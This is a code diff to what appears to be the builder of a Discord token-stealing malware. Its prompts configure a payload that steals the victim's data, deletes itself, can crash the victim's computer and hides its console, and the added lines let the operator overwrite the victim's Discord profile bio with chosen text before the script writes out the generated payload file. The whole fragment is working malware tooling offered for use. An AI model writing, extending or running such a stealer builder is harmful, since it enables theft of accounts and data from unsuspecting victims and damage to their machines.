@@ -45,6 +45,9 @@ while True:
     melter = get_boolean_input('Do you enable melter (Delete the file after using it DONT WORK WITH CRASHER) ? Y/N: ')
     crasher = get_boolean_input('Do you want the program to make the computer crash after it stole everything ? Y/N: ')
     hide = get_boolean_input('Do you want the program to make the console invicible ? Y/N: ')
+    change = get_boolean_input('Do you want to change the user (discord account) about me with custom text ? Y/N: ')
+    if change == True:
+        bio = input(r'''Input the text you want the user to have in his about me (Right click to paste) or put \n to skip a line -> ''')
 
     if melter == True:
         crasher = False
@@ -76,6 +79,9 @@ while True:
     new_content = new_content.replace("'%Melter%'", str(melter))
     new_content = new_content.replace("'%Crash%'", str(crasher))
     new_content = new_content.replace("'%Hide%'", str(hide))
+    new_content = new_content.replace("'%ChangeBio%'", str(change))
+    if change == True:
+        new_content = new_content.replace("'%Text%'", str(f"'''{bio}'''"))
     
     with open(f'./Build/temp.py', 'w', encoding='utf-8') as file:
         file.write(new_content)
